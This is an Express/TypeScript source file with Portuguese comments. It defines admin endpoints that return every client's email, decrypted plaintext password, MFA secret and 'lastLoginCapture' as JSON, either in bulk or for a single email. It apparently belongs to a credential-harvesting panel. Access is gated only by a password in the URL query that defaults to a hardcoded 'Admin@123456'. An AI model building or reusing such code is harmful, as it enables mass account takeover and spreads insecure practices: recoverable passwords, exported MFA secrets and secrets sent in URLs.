/**
 * Admin REST Endpoint
 * Endpoint simples para visualizar credenciais dos clientes via browser
 */

import type { Request, Response } from "express";
import * as adminDb from "./adminDb";

/**
 * GET /api/admin/credentials?password=ADMIN_PASSWORD
 * Retorna todas as credenciais em JSON
 */
export async function getCredentials(req: Request, res: Response) {
  try {
    // Senha de acesso simples (você pode mudar isso)
    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@123456";
    
    const providedPassword = req.query.password as string;
    
    if (!providedPassword || providedPassword !== ADMIN_PASSWORD) {
      return res.status(401).json({
        error: "Senha de admin inválida",
        hint: "Use ?password=ADMIN_PASSWORD na URL",
      });
    }
    
    // Buscar todas as credenciais
    const clients = await adminDb.getAllClientCredentials();
    
    // Formatar resposta
    const response = {
      total: clients.length,
      timestamp: new Date().toISOString(),
      clients: clients.map(client => ({
        id: client.id,
        email: client.email,
        password: client.passwordDecrypted,
        mfaEnabled: client.mfaEnabled === 1,
        mfaSecret: client.mfaSecret,
        lastLoginCapture: client.lastLoginCapture,
        createdAt: client.createdAt,
      })),
    };
    
    return res.json(response);
  } catch (error) {
    console.error("[Admin Endpoint] Error:", error);
    return res.status(500).json({
      error: "Erro ao buscar credenciais",
      message: error instanceof Error ? error.message : "Unknown error",
    });
  }
}

/**
 * GET /api/admin/credentials/:email?password=ADMIN_PASSWORD
 * Retorna credenciais de um cliente específico
 */
export async function getCredentialByEmail(req: Request, res: Response) {
  try {
    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@123456";
    const providedPassword = req.query.password as string;
    
    if (!providedPassword || providedPassword !== ADMIN_PASSWORD) {
      return res.status(401).json({
        error: "Senha de admin inválida",
      });
    }
    
    const email = req.params.email;
    if (!email) {
      return res.status(400).json({
        error: "Email não fornecido",
      });
    }
    
    const client = await adminDb.getClientCredentialsByEmail(email);
    
    if (!client) {
      return res.status(404).json({
        error: "Cliente não encontrado",
        email,
      });
    }
    
    return res.json({
      id: client.id,
      email: client.email,
      password: client.passwordDecrypted,
      mfaEnabled: client.mfaEnabled === 1,
      mfaSecret: client.mfaSecret,
      lastLoginCapture: client.lastLoginCapture,
      createdAt: client.createdAt,
    });
  } catch (error) {
    console.error("[Admin Endpoint] Error:", error);
    return res.status(500).json({
      error: "Erro ao buscar credenciais",
    });
  }
}
